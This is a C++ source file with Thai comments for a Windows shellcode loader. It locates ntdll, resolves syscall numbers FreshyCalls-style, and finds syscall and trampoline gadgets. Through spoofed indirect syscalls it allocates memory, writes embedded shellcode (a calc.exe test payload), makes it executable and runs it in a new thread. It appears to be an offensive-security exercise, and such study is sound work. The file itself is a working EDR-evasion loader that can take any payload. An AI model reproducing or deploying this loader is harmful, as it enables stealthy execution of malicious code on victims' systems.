#include "DefStack.h"
#include "ModularStack.h"
#include "StubStack.h"
#include "IndirectAlgoStack.h"

int main() {

	// หา Base Address Native Dll
	ULONG_PTR NtDllAddr = getNtdllBase();
	if (NtDllAddr == 0) {
		cout << "Error! NtDllBase is not found! \nError code is: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "NtDllBase is at: 0x" << hex << uppercase << NtDllAddr << endl;
	}

	// หา Native Dll Header
	PIMAGE_NT_HEADERS64 pNtHeader = getNtHeader(NtDllAddr);
	if (pNtHeader == NULL) {
		cout << "Native Header is not found! \n Error code is: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "Native Header location is at: 0x" << hex << pNtHeader << endl;
	}

	GadgetDetail findGadgetBox = { 0 };

	// ทำการโยน Dll Header ที่หามาได้เข้าไปเปรียบเทียบแบบ String
	// สังเกตว่าเราจะโยนเข้าไปด้วย Pointer ชี้ตำแหน่งของตัวแปรที่เก็บ Native Header แทนโยนตัวจริงเข้าไป
	// และส่ง findGadgetBox เข้าไปเพื่อรับเอาค่า Virtual Address และ ขนาดของ VA หลังหาเจอออกมาเก็บไว้
	if (findTextSection(pNtHeader, NtDllAddr, findGadgetBox)) {
		cout << "\n[+] Found .text at: 0x" << (void*)findGadgetBox.VA << endl;
	}
	else {
		cout << "\n[-] Section not found!" << endl;
		return -1;
	}

	// หา Export Table เพื่อนำมาใช้งานในการทำ Indirect Syscalls 
	// เราจะหาทั้ง ตำแหน่งของ Export Directory, name ของ SSN, 
	// ordinal ของ SSN นั้น, ตำแหน่งของฟังชันต์ และ จำนวนของชื่อ SSN
	EXPORT_TABLES ntdllExports = { 0 };
	if (getExportTables(NtDllAddr, pNtHeader, &ntdllExports)) {
		cout << "\n  Successfully resolved ntdll export tables!" << endl;
		cout << "[+] Export Directory is at: 0x" << hex << ntdllExports.pExportDir << endl;
		cout << "[+] Address Of Names is: " << hex << ntdllExports.pExportDir->AddressOfNames << endl;
		cout << "[+] Address Of NameOrdinals is: " << hex << ntdllExports.pExportDir->AddressOfNameOrdinals << endl;
		cout << "[+] Address Of Functions is: " << hex << ntdllExports.pExportDir->AddressOfFunctions << endl;
		cout << "[+] Number Of Names is: " << hex << ntdllExports.pExportDir->NumberOfNames << endl;
	}

	// หา Trampoline Gadget สำหรับเอาไปกลับบ้าน
	// ไม่เข้าใจให้กลับไปอ่านในเอกสาร Stack Spoofing หมวด Trampoline
	// รายละเอียดเต็ม ให้เข้าไปดูใน ModularStack ฟังชันต์ชื่อ findGadget
	PBYTE TrampolineGadget = findGadget(findGadgetBox);
	if (TrampolineGadget == nullptr) {
		cout << "\nTrampoline Gadget is null pointer! \nError Code is: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "\n[+] 1.Trampoline Gadget  is found at: 0x" << hex << (void*)TrampolineGadget << endl;
	}

	// ตรงนี้คือการหา Gadget สำหรับการทำ Indirect Syscalls
	// เราจะใช้ findGadgetBox เพิ้อดึงเอาตำแหน่งของเลข SSN มาหา Gadget สำหรับการทำงานขาไป
	PBYTE SyscallGadget = findSyscallGadget(findGadgetBox);
	if (SyscallGadget == nullptr) {
		cout << "Syscall Gadget is null pointer! \nError Code is: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "[+] 2.Syscall Gadget is found at: 0x" << hex << (void*)SyscallGadget << endl;
	}

	// เริ่มการหาฟังชันต์ เราจะใช้ String ในการเปรียบเทียบกับที่อยู่ของ SSN ใน ntdllExports
	// แน่นอนว่า เราจะใช้ Algorithm แบบ Freshycall ในการหา
	// หากไม่เข้าใจ โปรดอ่านที่เอกสารวิจัย Indirect Syscalls 
	const char targetFuncAlloc[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e',
									 'V', 'i', 'r', 't', 'u', 'a', 'l',
									 'M', 'e', 'm', 'o','r', 'y', 0 };
	DWORD SSNAlloc = getFreshyCallSSN(NtDllAddr, ntdllExports, targetFuncAlloc);
	if (SSNAlloc == 0) {
		cout << "\nError! SSN Gadget is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "\n[+] SSN Gadget is: 0x" << hex << SSNAlloc << endl;
	}

	// เริ่มส่งข้อมูลที่หามาได้เข้า ASM stub เพื่อทำงานร่วมกับเทคนิค Stack Spoofing
	HANDLE hProcess = (HANDLE)-1;
	PVOID baseAddr = nullptr;
	SIZE_T regionSize = 0x1000;

	NTSTATUS status = NtAllocate(
		hProcess,						// 1. Process Handle
		&baseAddr,						// 2. Base Address Pointer
		0,                              // 3. ZeroBits
		&regionSize,                    // 4. Region Size Pointer
		MEM_COMMIT | MEM_RESERVE,       // 5. Allocation Type (0x3000)
		PAGE_READWRITE,					// 6. Protection (ปรับเป็น Read Write ก่อน)
		SSNAlloc,                       // 7. [KEY 1] SSN 
		SyscallGadget,                  // 8. [KEY 2] Syscall Address
		TrampolineGadget                // 9. [KEY 3] JMP RBX Address
	);
	if (status == 0) { 
		cout << "[+] SUCCESS! Memory allocated via Spoofed Syscall!" << endl;
		cout << "[+] Payload Vault Address: 0x" << hex << baseAddr << endl;
	}
	else {
		cout << "[-] Failed to allocate memory. NTSTATUS: 0x" << hex << status << endl;
	}

	// Shellcode เด้งเครื่องเลขสำหรับทดสอบว่า Loader ทำงานสำเร็จ
	const uint8_t shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";

	// หาฟังชันก์เขียน Shellcode ลง RAM
	char targetFuncWrite[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 
							   'V', 'i', 'r', 't', 'u', 'a', 'l', 
							   'M', 'e', 'm', 'o', 'r', 'y', 0 };
	DWORD NtWriteSSN = getFreshyCallSSN(NtDllAddr, ntdllExports, targetFuncWrite);
	if (NtWriteSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: 0x" << hex << NtWriteSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncWrite << endl;
	}

	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
	NTSTATUS statusWrite = NtWrite(
		hProcess,						// 1. Process Handle
		baseAddr,						// 2. Base Address Pointer
		(PVOID)shellcode,				// 3. Buffer ของ Shellcode
		sizeof(shellcode),				// 4. Size of Shellcode
		NULL,							// 5. NumberOfBytesWritten เราไม่อยากรู้ว่าเท่าไหร่ ปล่อย
		NtWriteSSN,						// 6. [KEY 1] SSN 
		SyscallGadget,					// 7. [KEY 2] Syscall Address
		TrampolineGadget				// 8. [KEY 3] JMP RBX Address
	);
	if (statusWrite == 0) {
		cout << "[+] SUCCESS! Memory written via Spoofed Syscall!" << endl;
		cout << "[+] Payload Vault Address: 0x" << hex << baseAddr << endl;
	}
	else {
		cout << "[-] Failed to Write memory. NTSTATUS: 0x" << hex << statusWrite << endl;
	}

	// หาเลข SSN ของ NtProtectVirtualMemory
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncProtect[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't',
								 'V', 'i', 'r', 't', 'u', 'a', 'l', 
								 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	DWORD NtProtectSSN = getFreshyCallSSN(NtDllAddr, ntdllExports, targetFuncProtect);

	if (NtProtectSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: 0x" << hex << NtProtectSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncProtect << endl;
	}

	// สร้าง Variable สำหรับรับค่า out ออกมา
	ULONG oldProtect = { 0 };				// Protection เก่า RW ที่เรา set ไว้ตอนแรก
	SIZE_T sSize = sizeof(shellcode);		// ขนาดของ shellcode
	
	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
	NTSTATUS statusProtect = NtProtect(
		hProcess,						// 1. Process Handle
		&baseAddr,						// 2. Base Address Pointer
		&sSize,							// 3. Size of Shellcode
		PAGE_EXECUTE_READ,				// 4. Protection (ปรับเป็น Execute Read)
		&oldProtect,					// 5. รับ Protection เก่ามาเก็บไว้
		NtProtectSSN,					// 6. [KEY 1] SSN 
		SyscallGadget,					// 7. [KEY 2] Syscall Address
		TrampolineGadget				// 8. [KEY 3] JMP RBX Address
	);
	if (statusProtect == 0) {
		cout << "[+] SUCCESS! Memory Protection via Spoofed Syscall!" << endl;
		cout << "[+] Payload Vault Address: 0x" << hex << baseAddr << endl;
	}
	else {
		cout << "[-] Failed to protection memory. NTSTATUS: 0x" << hex << statusProtect << endl;
	}

	// หาเลข SSN ของ NtCreateThreadEx
	// เมื่อได้เลข SSN แล้ว จะนำไปเขียนลงใน Stub ASM
	char targetFuncCreate[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e',
								'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
	DWORD NtCreateSSN = getFreshyCallSSN(NtDllAddr, ntdllExports, targetFuncCreate);
	if (NtCreateSSN == 0) {
		cout << "Error! SSN number is not found! " << "Error code: " << GetLastError() << endl;
		return -1;
	}
	else {
		cout << "==============================================================================" << endl;
		cout << "\nSSN Number is: 0x" << hex << NtCreateSSN << endl;
		cout << "Function name of SSN number is: " << targetFuncCreate << endl;
	}

	// สร้าง variable สำหรับเปิด Thread เพื่อการทำงาน
	HANDLE hThread = NULL;

	// ส่งเข้า Parameter ให้ ASM Stub ทำงาน
	NTSTATUS statusCreate = NtCreate(
		&hThread,						// 1. Thread Handle
		THREAD_ALL_ACCESS,				// 2. Thread permission
		NULL,							// 3. กำหนดคุณสมบัติ Attribute เราข้าม
		hProcess,						// 4. Process Handle
		baseAddr,						// 5. Base Address Pointer
		NULL, 0, 0, 0, 0,				// parameter 6-10 เราไม่ปรับหรือใช้อะไร ข้าม
		NULL,							// parameter 11 ข้ามเช่นกัน
		NtCreateSSN,					// 12. [KEY 1] SSN
		SyscallGadget,					// 13. [KEY 2] Syscall Address
		TrampolineGadget				// 14. [KEY 3] JMP RBX Address
	);
	if (statusCreate == 0) {
		cout << "[+] SUCCESS! Memory Created via Spoofed Syscall!" << endl;
		cout << "[+] Payload Vault Address: 0x" << hex << baseAddr << endl;
	}
	else {
		cout << "[-] Failed to create memory. NTSTATUS: 0x" << hex << statusCreate << endl;
	}

	cout << "\nMISSION ACCOMPLISHED!" << endl;

	// รอ Thread ทำงานจบ
	WaitForSingleObject(hThread, 10);

	// ปิด handle ของ Thread และ Process ตามลำดับ
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}